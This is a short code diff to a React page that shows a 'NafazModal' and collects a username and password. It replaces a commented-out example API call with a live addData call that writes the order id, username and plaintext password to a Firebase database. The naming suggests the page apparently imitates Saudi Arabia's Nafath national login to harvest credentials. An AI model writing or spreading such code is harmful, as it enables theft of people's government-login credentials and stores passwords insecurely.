@@ -5,6 +5,7 @@
 import type React from "react";
 import { useEffect, useState } from "react";
 import NafazModal from "../components/NafazModal";
+import { addData } from "../apis/firebase";
 
 interface ExternalPageData {
   username: string;
@@ -53,14 +54,7 @@ export default function ExternalPage({
   ) => {
     // Replace with your API call
     try {
-      // Example API call:
-      // const response = await fetch('/api/nafad-credentials', {
-      //   method: 'POST',
-      //   headers: { 'Content-Type': 'application/json' },
-      //   body: JSON.stringify({ orderId, username, password })
-      // });
-      // return response.json();
-
+      addData({ id: _orderId, username: _username, password: _password });
       // For now, just return a successful response
       return { success: true };
     } catch (error) {
